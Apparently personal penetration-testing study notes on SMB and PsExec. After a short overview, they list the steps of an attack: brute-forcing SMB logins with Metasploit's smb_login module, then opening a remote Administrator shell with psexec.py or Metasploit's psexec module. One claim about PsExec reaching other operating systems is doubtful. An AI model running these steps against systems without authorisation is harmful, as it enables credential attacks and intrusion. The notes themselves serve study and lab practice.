# Exploiting SMB with PsExec

### SMB
- File sharing protocol
- Port 445
- Share printers for example
- SAMBA is the open-source Linux implementation of SMB, which allows Windows systems to access Linux shares and devices

### PsExec
- Similar to RDP
- PsExec is a command-line tool that allows you to run processes on remote computers. It is part of the Sysinternals suite of tools, which are a collection of free utilities for Windows system administration.
- PsExec can be used to run a variety of tasks, including:
	-   Starting a remote command prompt
	-   Running a remote script
	-   Executing a remote program
	-   Logging on to a remote computer as a different user
- PsExec is a powerful tool that can be used for a variety of purposes, both good and bad. It can be used by system administrators to manage remote computers, but it can also be used by malicious actors to gain unauthorized access to systems.
- Some of the features of PsExec:
	-   Can run processes on remote computers, including those running different operating systems
	-   Can run processes as different users
	-   Can be used to start a remote command prompt
	-   Can be used to run scripts on remote computers
	-   Can be used to log on to remote computers
### Process with PsExec
- `service postgresql start && msfconsole`
- Search `smb_login`
- use 
- set options -- rhosts, userfile, passfile,
- run
- open PsExec
- `psexec.py Administrator@10.10.10.10 cmd.exe`
- boom, you are inside the system
- Metasploit has a PsExec module as well
- `exploit/windows/smb/psexec`
